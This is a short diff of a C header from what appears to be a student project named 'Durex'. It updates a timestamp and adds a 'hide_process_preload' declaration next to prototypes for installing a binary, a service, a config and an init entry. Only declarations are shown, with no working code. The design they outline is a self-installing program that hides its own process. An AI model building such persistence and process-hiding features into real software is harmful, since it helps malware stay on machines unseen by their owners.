@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 02:49:13 by root              #+#    #+#             */
-/*   Updated: 2018/07/30 16:14:16 by root             ###   ########.fr       */
+/*   Updated: 2018/08/03 13:53:51 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -44,9 +44,10 @@ t_env			e;
 
 void			durex();
 int				install_binary(const char *prog);
-int				install_service();
-int				install_conf();
-int				install_init();
+int				install_service(void);
+int				install_conf(void);
+int				install_init(void);
+int				hide_process_preload(void);
 void			durexSigterm(int sig);
 void			quitClearlyDaemon();
 
